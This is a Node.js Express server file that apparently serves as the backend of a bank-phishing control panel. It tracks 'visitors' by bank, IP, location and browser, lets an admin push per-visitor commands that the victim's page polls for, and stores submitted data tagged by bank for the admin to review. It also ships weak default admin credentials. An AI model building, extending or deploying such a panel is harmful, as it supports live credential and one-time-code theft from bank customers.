import "dotenv/config";
import cors from "cors";
import express from "express";
import crypto from "crypto";
import { initDb, pool } from "./db.js";

const app = express();
app.use(cors());
app.use(express.json({ limit: "256kb" }));

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || "admin123";
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "admin-token-change-me";
const tokens = new Set([ADMIN_TOKEN]);

function requireAdmin(req, res, next) {
  const t = req.headers["x-admin-token"];
  if (t && tokens.has(t)) return next();
  return res.status(401).json({ error: "unauthorized" });
}

app.get("/api/health", (_, res) => res.json({ ok: true, at: Date.now() }));

// --- admin login ---
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const t = "t_" + crypto.randomBytes(16).toString("hex");
    tokens.add(t);
    return res.json({ ok: true, token: t });
  }
  return res.status(401).json({ error: "invalid credentials" });
});

// --- visitor register (public) ---
app.post("/api/visitors", async (req, res) => {
  try {
    const v = req.body || {};
    if (!v.id) return res.status(400).json({ error: "id required" });
    await pool.query(
      `INSERT INTO visitors(id, bank, bank_name, status, ip, city, country, ua, joined_at, last_seen)
       VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10)
       ON CONFLICT (id) DO UPDATE SET
         bank=EXCLUDED.bank, bank_name=EXCLUDED.bank_name,
         ip=EXCLUDED.ip, city=EXCLUDED.city, country=EXCLUDED.country,
         ua=EXCLUDED.ua, last_seen=EXCLUDED.last_seen,
         status=CASE WHEN visitors.status IS NULL THEN EXCLUDED.status ELSE visitors.status END`,
      [v.id, v.bank || "", v.bankName || "", v.status || "waiting", v.ip || "", v.city || "", v.country || "", v.ua || "", v.joinedAt || Date.now(), Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.post("/api/visitors/:id/heartbeat", async (req, res) => {
  try {
    const { id } = req.params;
    const p = req.body || {};
    await pool.query(
      `UPDATE visitors SET last_seen=$2, bank=COALESCE(NULLIF($3,''),bank), bank_name=COALESCE(NULLIF($4,''),bank_name), status=COALESCE(NULLIF($5,''),status) WHERE id=$1`,
      [id, Date.now(), p.bank || "", p.bankName || "", p.status || ""]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// visitor polls its latest command (public, per-id)
app.get("/api/visitors/:id/command", async (req, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM commands WHERE visitor_id=$1", [req.params.id]);
    res.json({ command: rows[0] || null });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// --- submissions (public submit) ---
app.post("/api/submissions", async (req, res) => {
  try {
    const s = req.body || {};
    if (!s.id || !s.visitorId || !s.kind) return res.status(400).json({ error: "id, visitorId, kind required" });
    await pool.query(
      `INSERT INTO submissions(id, visitor_id, bank, kind, data, at)
       VALUES($1,$2,$3,$4,$5,$6) ON CONFLICT (id) DO NOTHING`,
      [s.id, s.visitorId, s.bank || "", s.kind, JSON.stringify(s.data || {}), s.at || Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

// --- admin protected ---
app.get("/api/admin/visitors", requireAdmin, async (_, res) => {
  try {
    const { rows } = await pool.query("SELECT * FROM visitors ORDER BY last_seen DESC LIMIT 200");
    res.json({
      visitors: rows.map((r) => ({
        id: r.id, bank: r.bank, bankName: r.bank_name, status: r.status,
        ip: r.ip, city: r.city, country: r.country, ua: r.ua,
        joinedAt: Number(r.joined_at), lastSeen: Number(r.last_seen),
      })),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.post("/api/admin/commands", requireAdmin, async (req, res) => {
  try {
    const { visitorId, command } = req.body || {};
    if (!visitorId || !command) return res.status(400).json({ error: "visitorId, command required" });
    await pool.query(
      `INSERT INTO commands(visitor_id, type, at, by) VALUES($1,$2,$3,'admin')
       ON CONFLICT (visitor_id) DO UPDATE SET type=EXCLUDED.type, at=EXCLUDED.at`,
      [visitorId, command, Date.now()]
    );
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.get("/api/admin/submissions", requireAdmin, async (req, res) => {
  try {
    const { visitorId } = req.query;
    const { rows } = visitorId
      ? await pool.query("SELECT * FROM submissions WHERE visitor_id=$1 ORDER BY at DESC LIMIT 200", [visitorId])
      : await pool.query("SELECT * FROM submissions ORDER BY at DESC LIMIT 200");
    res.json({
      submissions: rows.map((r) => ({
        id: r.id, visitorId: r.visitor_id, bank: r.bank, kind: r.kind,
        data: r.data, at: Number(r.at),
      })),
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

app.delete("/api/admin/visitors/:id", requireAdmin, async (req, res) => {
  try {
    await pool.query("DELETE FROM visitors WHERE id=$1", [req.params.id]);
    await pool.query("DELETE FROM commands WHERE visitor_id=$1", [req.params.id]);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "db error" });
  }
});

const PORT = process.env.PORT || 4000;
initDb().then(() => app.listen(PORT, () => console.log(`[api] listening on ${PORT}`)));
